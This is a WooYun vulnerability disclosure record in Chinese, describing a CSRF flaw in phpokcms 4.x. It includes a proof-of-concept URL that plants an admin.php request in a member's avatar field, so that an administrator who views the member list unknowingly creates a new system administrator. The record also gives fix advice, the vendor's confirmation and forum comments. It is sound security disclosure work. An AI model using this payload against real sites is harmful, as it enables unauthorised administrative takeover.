{"id": 53530, "wybug_id": "wooyun-2014-067384", "wybug_title": "phpokcms 4.x CSRF漏洞", "wybug_corp": "phpok.com", "wybug_author": "do9gy", "wybug_date": "2014-07-04 17:49", "wybug_open_date": "2014-10-02 17:50", "wybug_type": "CSRF", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": [], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-07-04：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-07-04：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-07-07：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-08-28：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-09-07：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-09-17：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-10-02：\t细节向公众公开  简要描述： 可蠕虫，可添加系统管理员。 详细说明：  phpokcms存在csrf漏洞，管理员查看会员列表时不知不觉会自动添加新的系统管理员。位置在会员头像处的img标签，由于新闻评论可显示头像，也可蠕虫发评论。下面仅证明添加管理员的部分。具体代码分析了，直接poc。   漏洞证明：  注册会员后打开如下链接。（域名路径请视情况修改）http://127.0.0.1/phpok/api.php?c=usercp&f=avatar&data=%2fphpok%2fadmin.php%3Fc%3Dadmin%26f%3Dsave%26id%3D%26account%3Dadmin2%26pass%3Dadmin2%26email%3Dadmin%2540a1.com%26status%3D1%26if_system%3D1然后登录管理员后台，点击会员（此时一个名为admin2 密码为admin2的系统管理员已经添加成功。）再打开设置，管理员维护去看一下即可。   修复方案：  修改设置头像接口，将url固定。 同时加强对关键功能的csrf控制，加入二次确认，或token。   版权声明：转载请注明来源 do9gy@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2014-07-04 22:00 厂商回复： 感谢您提供这个漏洞说明~我们会在月底更新程序时修复！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-07-08 13:07 |    \t\tmagerx \t\t\t( 普通白帽子  |\t\t\t        Rank:257 漏洞数:45        | 别说话。)\t\t \n  ~~~我来给你评论鸟    \n     2014-07-08 14:29 |    \t\tdo9gy \t\t\t( 实习白帽子  |\t\t\t        Rank:61 漏洞数:15        | Dog loves God。)\t\t \n  @magerx 小m求带！    \n     2015-01-29 19:05 |    \t\t封停 \t\t\t( 实习白帽子  |\t\t\t        Rank:38 漏洞数:8        | 求老中医指路)\t\t \n  说好的要带我飞的呢...@do9gy    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}